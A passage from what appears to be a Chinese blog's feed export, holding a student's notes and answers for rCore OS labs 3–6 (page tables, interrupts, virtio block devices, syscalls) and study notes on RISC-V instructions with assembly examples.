也会被复制到 <code>a0</code> 作为 <code>handle_interrupt</code> 的参数）</p></li><li><p>从中断中返回时（<code>__restore</code> 时），<code>a0</code> 应指向**被压在内核栈中的 <code>Context</code>**。此时出栈 <code>Context</code> 并且将栈顶保存到 <code>sscratch</code> 中</p><p>运行时如何 将内核栈指针保存在<code>sscratch</code>中?</p></li></ul></li></ul></li></ol><img src="https://github.com/dingiso/DailySchedule/blob/master/img/sscratch.png"  alt="sscratch" /><h2 id="lab-5"><a href="#lab-5" class="headerlink" title="lab-5"></a>lab-5</h2><ol><li><p>不能一直运行内核 ，我们要实现把读取存储设备的数据，<strong>OpenSBI</strong> 进行扫描并设备通过<strong>MMIO</strong>映射到物理内存的一块了，我们只需要在rust_main 中添加参数，OpenSBI 就会告诉我们映射的地址</p><ul><li><p><code>_hart_id</code>:  0,</p><p><code>dtb_pa</code>:  PhysicalAddress(0x82200000)</p></li></ul></li><li><p>通过调用 rcore 中的 属性解析<code>device_tree</code>库，我们得到的便是一个 建好的树  - <strong>设备树</strong></p><ul><li>通过 递归 从根节点进行递归 ，发现支持 <code>&quot;virtio,mmio&quot;</code> ， 就可以加载他的驱动</li><li>初始化设备 时需要进行验证<code>Magic Number</code> ， 确定其为设备树</li></ul></li><li><p>进一步对节点进行判断， 只读取其中的 <code>Block</code> 块设备</p><ul><li>粒度 为 整<strong>块</strong>，以块为单位读写，（类比硬盘）</li></ul></li><li><p>实现为 <code>DMA</code> 分配物理页的定义和操作 包括 <strong>物理地址-虚拟地址的转换</strong>， <strong>分配和去配操作</strong></p></li><li><p>抽象设备 驱动的接口 ，简单的三种方法 ：</p><ul><li>读取设备信息</li><li>块设备接口<ul><li>读取某个块 到 buffer 中， 实现对数据的读取</li><li>将 buffer 的数据 写入 某个块， 实现写数据</li></ul></li></ul></li><li><p>对块设备的抽象，基本为实现上述 的 三个接口。</p><img src="https://github.com/dingiso/DailySchedule/blob/master/img/design.png"  alt="design" /></li><li><p> 文件系统 利用 rcore-fs 通过查找全部设备驱动中的第一个存储设备作为根目录。</p></li><li><p>同时调用<code>BlockCache::new()</code> 使得设备在内存中具有<code>cache</code></p></li><li><p>最后 通过 调用 以实现的接口中的 <code>ls</code> 进行 文件名的输出</p></li></ol><h2 id="lab-6"><a href="#lab-6" class="headerlink" title="lab-6"></a>lab-6</h2><ol><li><p>建立 <code>user</code> crate，作为用户程序的放置位置 - 并为其去除依赖</p></li><li><p>通过 <code>rcore-fs-fuse</code> 将我们的用户程序编译打包为 <strong>ELF</strong> 文件-转换为 <strong>QCOW_FILE</strong> 格式</p></li><li><p>利用 <code>xmas_elf</code> 解析器将 ELF 文件读到内存中，解析字段，建立<strong>内核映射</strong>（能中断）</p></li><li><p>修改<code>Mapping::map</code> 函数 ， 增加 <code>init_data</code>参数为初始化数据</p><ul><li>动态分配内存 - 分配的不一定连续 - 利用<strong>帧分</strong>配的方式</li><li>考虑 如果最后剩下的数据不满足一页的情况</li><li>加载到内存时， 对 <code>.bss</code> 段进行初始化</li></ul></li><li><p>利用汇编参数的传递，实现系统调用，从相应的寄存器中取出调用代号和参数，根据调用代号，进入不同的处理流程，得到处理结果</p><ul><li><p>回数值并继续执行：</p><ul><li>返回值存放在 <code>x10</code> 寄存器，<code>sepc += 4</code>，继续此 <code>context</code> 的执行</li></ul></li><li><p>程序进入等待</p><ul><li>同样需要更新 <code>x10</code> 和 <code>sepc</code>，但是需要将当前线程标记为等待，切换其他线程来执行</li></ul></li><li><p>程序终止</p><ul><li>不需要考虑系统调用的返回，直接删除线程</li></ul></li></ul></li><li><p>编写文件的输入输出流 <code>stdin</code> <code>stdout</code></p></li><li><p>实现条件变量，替代原来的阻塞式，增加处理器利用率，增强交互性</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore实验四总结</title>
      <link href="/2020/07/25/%E5%AE%9E%E9%AA%8C%E5%9B%9B/"/>
      <url>/2020/07/25/%E5%AE%9E%E9%AA%8C%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>实验四的分析及解答</p><a id="more"></a><h1 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h1><ol><li><p>原理：线程切换之中，页表是何时切换的？页表的切换会不会影响程序 / 操作系统的运行？为什么？</p><p>1）线程结束时，ra 结束函数触发时钟中断，中断处理函数调用 <code>prepare_next_thread()</code> , 在实际调用 <code>next_thread.prepare()</code>  最后通过 <code>activate()</code> 激活页表，进行页表的切换</p><p>2）不会影响运行，页表切换发生在中断期间，操作系统运行中，我们设立了内核栈，中断期间调用的，一直存在。</p></li><li><p>设计：如果不使用 <code>sscratch</code> 提供内核栈，而是像原来一样，遇到中断就直接将上下文压栈，请举出（思路即可，无需代码）：</p><ul><li>一种情况不会出现问题    - 不操作 sp </li><li>一种情况导致异常无法处理（指无法进入 <code>handle_interrupt</code>）- 不保存 sp 寄存器</li><li>一种情况导致产生嵌套异常（指第二个异常能够进行到调用 <code>handle_interrupt</code>，不考虑后续执行情况） - 运行两个线程。在两个线程切换的时候，会需要切换页表。但是此时操作系统运行在前一个线程的栈上，一旦切换，再访问栈就会导致缺页，因为每个线程的栈只在自己的页表中</li><li>一种情况导致一个用户进程（先不考虑是怎么来的）可以将自己变为内核进程，或以内核态执行自己的代码 -  通过 改变 sp 的存储位置， 使得用户进程有能力访问并修改到</li></ul></li><li><p>实验：当键盘按下 Ctrl + C 时，操作系统应该能够捕捉到中断。实现操作系统捕获该信号并结束当前运行的线程（你可能需要阅读一点在实验指导中没有提到的代码）</p><p><a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E5%9B%9B/handler.rs">handler.rs</a></p><p> 通过开启外部中断的方法， 借助 sbi 调用函数，捕捉键盘导致的外部中断，先在  中断处理时打印 ctrl+c 的 sbi 调用返回值，为3 ，判断其为 3 则 <code>kill_current_thread</code></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore实验三总结</title>
      <link href="/2020/07/25/%E5%AE%9E%E9%AA%8C%E4%B8%89/"/>
      <url>/2020/07/25/%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<p>实验三的分析及解答</p><a id="more"></a><h1 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h1><ol><li><p>原理：在 <code>os/src/entry.asm</code> 中，<code>boot_page_table</code> 的意义是什么？当跳转执行 <code>rust_main</code> 时，不考虑缓存，硬件通过哪些地址找到了 <code>rust_main</code> 的第一条指令？</p><p>1） 因为我们将内核统一使用虚拟地址，所以需要一个初始的页表进行映射，也就是题中所说的<code>boot_page_table</code>， 因为他的asw 不全为0 ， 它包含了 两个 1GB 大页 分别表示映射</p><table><thead><tr><th>虚拟地址</th><th>物理地址</th></tr></thead><tbody><tr><td>0x8000_0000 - 0xC000_0000</td><td>0x8000_0000 - 0xC000_0000</td></tr><tr><td>0xffff_ffff_8000_0000-0xffff_ffff_c000_0000</td><td>0x8000_0000 - 0xc000_0000</td></tr></tbody></table><p>第二项 为  我们以后将要使用的虚拟地址 与 物理地址之间的映射</p><p>第一项 是因为我们 在 替换页表后，pc 仍不会改变，所以需要先行利用这个继续运行，带pc改变后，改为 第二个映射</p><p>2）先从 satp 高位读取内存的映射方式，低位读取 <code>boot_page_table</code> 的物理页号，</p><p>读取 VPN3 【30：38】  <code>0xff</code> 为  <code>111111110</code>  为 510 定位到 510项， 判断页表项得知为大页</p><p>从表中知道物理页基址为 0x8000_0000 加上，页内偏移量，找到了 <code>rust_main()</code> 的地址</p></li><li><p>分析：为什么 <code>Mapping</code> 中的 <code>page_tables</code> 和 <code>mapped_pairs</code> 都保存了一些 <code>FrameTracker</code>？二者有何不同？</p><p>page_tables   存放页表会用到的页面</p><p>mapped_pairs 存放所有映射过的页面， 进程用到的页面</p></li><li><p>分析：假设某进程需要虚拟地址 A 到物理地址 B 的映射，这需要操作系统来完成。那么操作系统在建立映射时有没有访问 B？如果有，它是怎么在还没有映射的情况下访问 B 的呢？</p><p>没有访问B，我们需要申请建立页表时，会得到 B 的物理地址，但特殊情况， 如果B是内核地址，我们可以直接通过线性偏移量进行访问。</p></li><li><p><strong>实验框架尚未准备完善）</strong>实验：了解并实现时钟页面置换算法（或任何你感兴趣的算法），可以自行设计样例来比较性能</p><ul><li><p>置换算法只需要修改 <code>os/src/memory/mapping/swapper.rs</code>，你可能需要在其中访问页表项</p></li><li><p><a href="https://github.com/dingiso/DailySchedule/blob/master/code/%E5%AE%9E%E9%AA%8C%E4%B8%89/swapper.rs">swapper.rs</a> </p></li><li><p>在 <code>main.rs</code> 中调用 <code>start_kernel_thread</code> 来创建线程，你可以任意修改其中运行的函数，以达到测试效果</p><p>为确保<code>PageTableEntry</code> 安全传输 - 为时钟swapper 实现 send 接口</p><p>在pop 的时候，如果该页表项<code>PageTableEntry</code> 以访问（ACCESS=1） 或者 已修改 （DIRTY=1） 就将其置零</p><p>否则， 就将其替换掉</p></li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> risc-v </tag>
            
            <tag> rCore </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解计算机系统-RISC-V</title>
      <link href="/2020/07/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E8%AE%BE%E8%AE%A1RISC-V/"/>
      <url>/2020/07/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E8%AE%BE%E8%AE%A1RISC-V/</url>
      
        <content type="html"><![CDATA[<p>本文是在阅读《深入理解计算机系统-RISC-V 》后写的，主要针对risc-v架构的内容的阐述</p><a id="more"></a><h1 id="计算机组成与设计RISC-V"><a href="#计算机组成与设计RISC-V" class="headerlink" title="计算机组成与设计RISC-V"></a>计算机组成与设计RISC-V</h1><h2 id="Chapter1-Computer-Abstractions-and-Technology"><a href="#Chapter1-Computer-Abstractions-and-Technology" class="headerlink" title="Chapter1 Computer Abstractions and Technology"></a>Chapter1 Computer Abstractions and Technology</h2><h3 id="1-1-Intorduction"><a href="#1-1-Intorduction" class="headerlink" title="1.1 Intorduction"></a>1.1 Intorduction</h3><p>计算机应用主要分<strong>三</strong>个领域 ： PC ， 服务器 ，嵌入式</p><p>在现在时代 PC 已经逐渐被 PMD（Personal Mobile Device） 所取代</p><p>本书涉猎的内容</p><blockquote><p>高级语言如何转为机器语言，硬件如何执行程序；</p><p>软硬件接口是什么，软件如何让硬件执行特定功能；</p><p>什么决定了程序的性能，怎么提高性能，降低能耗；</p><p>并行计算的原因及其后续演进；</p><p>现代计算机架构中的八个伟大思想；</p></blockquote><h3 id="1-2-八个伟大的计算机思想"><a href="#1-2-八个伟大的计算机思想" class="headerlink" title="1.2 八个伟大的计算机思想"></a>1.2 八个伟大的计算机思想</h3><ul><li>摩尔定律的发明</li><li>抽象化方法</li><li>加速常用事务</li><li>并行计算</li><li>流水线机制</li><li>预测机制</li><li>内存的金字塔结构</li><li>利用冗余提高可靠性</li></ul><p>两种 底层软件： 操作系统 和 编译器</p><h3 id="1-6-计算机的表现"><a href="#1-6-计算机的表现" class="headerlink" title="1.6 计算机的表现"></a>1.6 计算机的表现</h3><p>定义时间</p><p>运行时间分为 ： 经过时间 ， 相应时间 ， 运行时间</p><p>CPU 执行时间分为 ： 单纯执行程序的时间 ， 为了执行程序 而 调用 操作系统的时间</p><ul><li>时钟周期数=指令个数$$\times$$指令平均时钟个数</li><li>clock cycles per instrunction,简称 <code>CPI</code>  为所有指令执行的时钟个数的平均</li></ul><p>CPU 执行时间 = 指令数 * CPI * 时钟时间</p><p>评判标准</p><p>要依据不同情况而判断，如一些服务器对IO很依赖，需要软硬件综合性能，</p><p>而一些应用则可能只关注 吞吐量 或者反应时间，或者两者的组合。</p><p>所以为提高表现，你必须要知道哪些方面影响着他，从而方便找到瓶颈</p><p>提高标准</p><p>减少应用程序的时钟个数或者提高时钟频率</p><h3 id="1-7-功耗墙"><a href="#1-7-功耗墙" class="headerlink" title="1.7 功耗墙"></a>1.7 功耗墙</h3><p>首先介绍了8代Intel CPU的频率和功耗走势图；需要注意的是在Pentium4（2001）时，频率达到3.6GHz,功耗达到103M，起后频率与功耗都有降低；</p><p>其次介绍单个晶体管的动态功耗(焦耳和瓦特角度）：<br> Energy<img src="https://math.jianshu.com/math?formula=%5Cpropto" alt="\propto">1/2<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Capacitive load<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Voltages2<br> Power<img src="https://math.jianshu.com/math?formula=%5Cpropto" alt="\propto">1/2<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Capacitive load<img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times"> Voltages2 <img src="https://math.jianshu.com/math?formula=%5Ctimes" alt="\times">Frequency switched</p><p>Frequency switched和时钟频率相关；<br> with regard to the Figure, how could clock rates grow by a factor of 1000 while power increased by only a factor of 30?(频率有1000倍增长而功耗只有30倍增长)<br> Energy and thus power can be reduced by lowering the voltage，每代CPU都采用这种技术，即每代电压减少15%（0.0225）</p><p>In 20 years, voltages have gone from 5V to 1V, which is why the increase in power is only 30 times.(0.0225x1000=22.5<img src="https://math.jianshu.com/math?formula=%5Capprox" alt="\approx">30)</p><p>现代的问题是，继续降低电压会使晶体管too leaky（服务器芯片40%功耗来源于leakage）</p><p>to try to adress the power problem, designers have already attached large devices to increase cooling. and they turn off parts of the chip that are not used in a given clock cycle.<br> 尽管需要高昂的降温设备（300W功耗），这种方案还是应用于PC和server，而PMD则不需要；</p><p>Power  is  a challenge for integrated circuits for 2 reasons:</p><ol><li>power must be brought in and distributed around the chip;现代芯片可能需要数百个ground和power的引脚</li><li>power is dissipated as heat and must be removed.(功耗消耗为热量需要更贵的散热设备)</li></ol><blockquote><p>为了解决能耗问题，引入多处理器概念，要求我们要重新编写程序以适应。</p></blockquote><h2 id="Chapter2-计算机-“语言”-介绍"><a href="#Chapter2-计算机-“语言”-介绍" class="headerlink" title="Chapter2 计算机 “语言” 介绍"></a>Chapter2 计算机 “语言” 介绍</h2><h3 id="2-2-硬件编程语言"><a href="#2-2-硬件编程语言" class="headerlink" title="2.2 硬件编程语言"></a>2.2 硬件编程语言</h3><p><code>add a,b,c</code>  将变量<code>b</code>，<code>c</code>相加后放入<code>a</code>中</p><p>每个 RISC-V 指令 只执行一个操作，最多允许三个变量</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;例1 a &#x3D; b+c+d+eadd a,b,cadd a,a,dadd a,a,e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>设计理念1 ：简单有利于规整化</p></blockquote><h3 id="2-3-操作数"><a href="#2-3-操作数" class="headerlink" title="2.3 操作数"></a>2.3 操作数</h3><p>RISCV中，算术运算指令的操作数只能来自于寄存器，每个寄存器大小为64bits，只有32个</p><blockquote><p>设计理念2：简洁就是速度</p></blockquote><p>理解：当寄存器变多，硬件寻址时间会随之变长，从而降低性能；</p><p>寄存器表示方法 = X + 数字</p><p>寄存器的容量是有限的，当需要大的数据结构时，就需要存储在内存中，内存相比于寄存器要大的多，但是访问速度也有数量级的差距。</p><p>但算术指令只能操作寄存器，所以我们要先将内存中的数据读入寄存器，进行操作后，再存回内存中，其中 内存-》寄存器 称为 load，寄存器-》内存 称为 store</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#例子2 ： g&#x3D;h+A[8] A为大64位数据 编译器分配 g-X20 h-X21 A的基址存在X22ld x9, 8(x22) &#x2F;&#x2F; 临时寄存器 x9 得到 A[8]add x20,x21,x9 &#x2F;&#x2F; g &#x3D; h + A[8]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>8(x22)</code> 为一种内存表示法，8是偏移量，x22 存储了A数组的基址</p><p>现在大部分结构仍然采用 字节 寻址的方式，RISC-V也不例外；所以寄存器和内存都表示为0x8，0x10，0x18 等</p><p>在 64bit 中 byte 的排序问题，一般有两种方式： 大端-从大到小，小端-从小到大</p><p>RISC-V 采用小端寻址的方式</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#例子3 A[12]&#x3D;h+A[8]ld  x9,64(x22)add x9,x21,x9sd  x9,96(x22)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这种平凡的访问内存的行为称为 寄存器溢出</p><h4 id="常量-和-立即数"><a href="#常量-和-立即数" class="headerlink" title="常量 和 立即数"></a>常量 和 立即数</h4><p>RISC-V 将近一半的指令需要操作 立即数 或 常量</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 例4 ： x22+4ld  x9,AddConstant 4(x3) &#x2F;&#x2F; x9 &#x3D; constant 4add x22,x22,x9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序编译后会将常量4 写入内存中</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># 例5：立即数指令addi x22,x22,4 &#x2F;&#x2F;x22&#x3D;x22+4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意: 对于常用的常量0 ， RISC-V 将 <code>0</code> 固定放入 <code>x0</code> 中</p><h3 id="2-5-指令表示"><a href="#2-5-指令表示" class="headerlink" title="2.5 指令表示"></a>2.5 指令表示</h3><p><img src="https://upload-images.jianshu.io/upload_images/18610675-d358b3032c45c963.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/750/format/webp" alt="指令表示"></p><h3 id="2-6-逻辑指令"><a href="#2-6-逻辑指令" class="headerlink" title="2.6 逻辑指令"></a>2.6 逻辑指令</h3><p><code>左移</code> <code>右移</code> <code>AND</code> <code>OR</code> <code>XOR</code> <code>NOT</code> 等</p><h3 id="2-7-分支指令"><a href="#2-7-分支指令" class="headerlink" title="2.7 分支指令"></a>2.7 分支指令</h3><p>两个主要指令：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&#x2F;&#x2F; 如果相等则继续beq rs1,rs2,L1&#x2F;&#x2F; 如果不等则继续bne rs1,rs2,L1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="例6"><a href="#例6" class="headerlink" title="例6"></a>例6</h4><p>如何将以下c语言编译为RISC-V格式</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// c 语言</span><span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>j<span class="token punctuation">)</span> f<span class="token operator">=</span>g<span class="token operator">+</span>h<span class="token punctuation">;</span> <span class="token keyword">else</span> f <span class="token operator">=</span> g<span class="token operator">-</span>h<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>f</th><th>g</th><th>h</th><th>i</th><th>j</th></tr></thead><tbody><tr><td>x19</td><td>x20</td><td>x21</td><td>x22</td><td>x23</td></tr></tbody></table><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&#x2F;&#x2F; RISC - V bne x22,x23,Elseadd x19,x20,x21Else: sub x19,x20,x21Exit:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="例7-loops"><a href="#例7-loops" class="headerlink" title="例7 - loops"></a>例7 - loops</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span>save<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>k<span class="token punctuation">)</span> i<span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>i</th><th>k</th><th>数组基址</th></tr></thead><tbody><tr><td>x22</td><td>x24</td><td>x25</td></tr></tbody></table><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">Loop: slli x10,x22,3 # x10 &#x3D; i*8 左移三位add x10,x10,x25 # x10 &#x3D; save[i]的地址ld  x9,0(x10) # x9 &#x3D; save[i]的值bne x9,x24 Exit #如果 save[i]！&#x3D;k 退出addi x22,x22,1 # i&#x3D;i+1beq x0,x0,Loop #回到开始Exit:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>名词解释：</strong>  基本块（ basic block）</p><p>基本块就是一系列除了结尾就没有分支，除了开始姐们为分支标签的语句，通俗来说，只要基本块中第一条指令被执行了，那么基本块内所有执行都会按照<strong>顺序</strong>仅<strong>执行一次</strong> 。编译的第一步就是将程序分成基本块</p><h4 id="其他分支语句"><a href="#其他分支语句" class="headerlink" title="其他分支语句"></a>其他分支语句</h4><p><code>blt</code>   和  <code>bge</code>   将寄存器的值当做    补码    进行比较</p><p><code>bltu</code> 和 <code>bgeu</code> 将寄存器的值当作无符号数进行比较</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># if x20&gt;&#x3D;x11 or if x20 negativebgeu x20,x11,IndexOutOfBounds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-8-计算机硬件对过程的支持"><a href="#2-8-计算机硬件对过程的支持" class="headerlink" title="2.8 计算机硬件对过程的支持"></a>2.8 计算机硬件对过程的支持</h3><p><strong>过程</strong>或者<strong>函数</strong>是用来结构化程序的工具，使用过程能够让程序变得易读且增强代码的重用性，程序员只需要关注任务的一部分。参数可以用来传递和返回值，可以用作过程和其他程序的接口。我们可以认为过程就像一个执行秘密任务的间谍，获取所需资源、执行任务、掩盖行踪，最后带着结果回到原处。任务完成后就不再干涉其他任务。同样我们可以将过程的执行分为六步 :</p><ol><li> 将参数放在过程能访问的地方</li><li> 将控制交给过程</li><li> 获取需要的存储资源给过程</li><li> 完成预定的任务</li><li> 将结果放到调用程序能访问的地方</li><li> 将控制交回源点</li></ol><p>由于寄存器是在计算机中最快的存储器，程序应尽可能使用寄存器。RISC-V提供了一些寄存器来给调用过程时使用 :</p><ul><li><code>x10</code>-<code>x17</code> : 存储需要传递的参数 和 返回值</li><li><code>x1</code> : 存储过程调用源点的地址</li></ul><p>除了分配了这些寄存器，RISC-V提供了一条跳转链接指令jal。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jal ProcedureAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>jal ： 跳转 并 连接 程序结构，主要完成</p><ul><li>跳转到<code>ProcedureAddress</code>继续执行</li><li>将<code>ProcedureAddress</code> 保存到 <code>x1</code> 寄存器</li></ul><p>被执行的过程取到x1地址，并继续执行</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jalr x0,0(x1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或 直接进行无条件跳转</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">jal x0,Label<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>如果一个过程需要用到多个寄存器，使用完成后还需要恢复，存储多个值是，就需要使用<strong>堆栈</strong></p><p>例如</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">leaf_example</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> g<span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> h<span class="token punctuation">,</span>                           <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> f<span class="token punctuation">;</span>    f<span class="token operator">=</span><span class="token punctuation">(</span>g<span class="token operator">+</span>h<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> f<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>翻译为汇编语言</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">leaf_example:addi sp,sp,-24sd x5,16(sp)sd x6,8(sp)sd x20,0(sp)add x5,x10,x11add x6,x12,x13sub x20,x5,x6addi x10,x20,0ld x20,0(sp)ld x6,8(sp)ld x5,16(sp)addi sp,sp,24jaalr x0,0(x1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中  <strong>g/h/i/j对应x10/x11/x12/x13，f对应x20</strong></p><h4 id="寄存器分类"><a href="#寄存器分类" class="headerlink" title="寄存器分类"></a>寄存器分类</h4><p>RISC-V 将 19 个临时寄存器分为两类</p><ul><li>x5-x7 and x28-x31 ： 在过程调用时不会被调用方保存的</li><li>x8-x9 and x18-x27 ： 在过程调用时一定会被保存的</li></ul><p>所以  line3/4/13/14 store和load 的操作可以省去</p><h4 id="嵌套程序"><a href="#嵌套程序" class="headerlink" title="嵌套程序"></a>嵌套程序</h4><p>如果程序 调用其他的函数，我们很好理解，但是 如果调用自己，形成递归过程，我们就要特殊注意了</p><p><strong>例子 ： 递归</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">fact</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">else</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>n<span class="token operator">*</span><span class="token function">fact</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//parameter n存在x10中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">FACT:  addi sp,sp,-16   &#x2F;&#x2F;adjust stack for 2 items      sd   x1,8(sp)    &#x2F;&#x2F;save the return address      sd   x10,0(sp)   &#x2F;&#x2F;save the argument n      addi x5,x10,-1   &#x2F;&#x2F;x5&#x3D;n-1      bge  x5,x0,L1    &#x2F;&#x2F;if(n-1)&gt;&#x3D;0,go to L1      addi x10,x0,1    &#x2F;&#x2F;return 1      addi sp,sp,16    &#x2F;&#x2F;pop 2 items off stack      jalr x0,0(x1)    &#x2F;&#x2F;return to callerL1:   addi x10,x10,-1  &#x2F;&#x2F;n&gt;&#x3D;1: argument gets(n-1)      jal  x1,FACT     &#x2F;&#x2F;call fact with(n-1)      addi x6,x10,0    &#x2F;&#x2F;return from jal:move result of fact(n-1) to x6      ld   x10,0(sp)   &#x2F;&#x2F;restore argument n      ld   x1,8(sp)    &#x2F;&#x2F;restore the return address      addi sp,sp,16    &#x2F;&#x2F;adjust stack point to pop 2 items      mul  x10,x10,x6  &#x2F;&#x2F;return n*fact(n-1)      jalr x0,0(x1)    &#x2F;&#x2F;return to the caller  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​     注意jal、jalr，ld 等指令指挥这指令跳来跳去，并且将stack的参数一步步的推出；</p><p>C语言变量可以按照2类分：</p><ul><li>类型<ul><li>数字</li><li>字符</li></ul></li><li>生命周期<ul><li>automatic</li><li>static</li></ul></li></ul><p>automatic对于一个过程而言是本地的，程序调用完成后自动消失；</p><p>static则贯穿始终；一般用static标识声明；</p><h4 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h4><table><thead><tr><th>Preserved</th><th>Not Preserved</th></tr></thead><tbody><tr><td>saved registers：x8-x9,x18-x19</td><td>Temprary registers:x5-x7,x28-x31</td></tr><tr><td>Stack pointer register:x2(sp)</td><td>Argument/result register:x10-x17</td></tr><tr><td>Frame pointer:x8(fp)</td><td></td></tr><tr><td>Return address:x1(ra)</td><td></td></tr><tr><td>Stack above the stack pointer</td><td>Stack below the stack pointer</td></tr></tbody></table><p><strong>在栈上为新数据申请空间</strong></p><p> <strong>Stack</strong>被称为栈，存储程序调用的automatic型的本地变量；</p><blockquote><p> The segment of the stack containing a procdure’s saved registers and local variables is called a <strong>procedure frame</strong> or <strong>activation record</strong>.</p></blockquote><p>一些RISC-V编译器使用<code>FP（frame pointer）</code>指向栈的收低值。使用FP的好处是可以很方面的定位local parameter的位置，方便调试与定位；</p><p>Stack一般是从高地址往低地址递减的；</p><p><strong>在堆上为新数据申请空间</strong></p><p> 